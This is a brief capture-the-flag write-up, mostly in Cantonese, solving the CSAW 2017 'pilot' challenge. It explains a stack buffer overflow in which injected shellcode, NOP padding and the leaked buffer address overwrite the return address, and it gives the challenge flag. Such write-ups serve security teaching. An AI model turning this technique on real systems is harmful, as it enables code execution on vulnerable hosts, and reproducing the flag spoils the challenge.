# CSAW 2017 pwn 75 pilot

# 題目:


>                                         pilot
>                                 Can I take your order?
>                                 nc pwn.chal.csaw.io 8464
>                               16:05 Eastern: Updated binary

>[pilot](pilot)

呢題係google題,只要你中一個shellcode, 就get flag

Checksec:

```pyrhon
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

IO dump:

```
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffe070
[*]Command:aaaaaaaaaaa

````


呢題冇開nx, 可以run shellcode,

check 0x7fffffffe070係指去乜地方先


stack dump
```
──────────────────────────────────────── Stack ────────────────────────────────────────
0000| 0x7fffffffe070 ('a' <repeats 11 times>, "\n")
0008| 0x7fffffffe078 --> 0xa616161 ('aaa\n')


```

原來係指去input buffer address -_-

exploit就係:shellcode+padding+input buffer address

padding='\x90'*(40-len(shellcode))

其中40係buffersize+RBP 

作為一個小薯,之後嘅動作當然係上shellstorm 抄shellcode

大概copy and paste 左10條shellcode左右就get shell,亦都係呢條題目嘅難點 =_=

```
flag: flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}

```


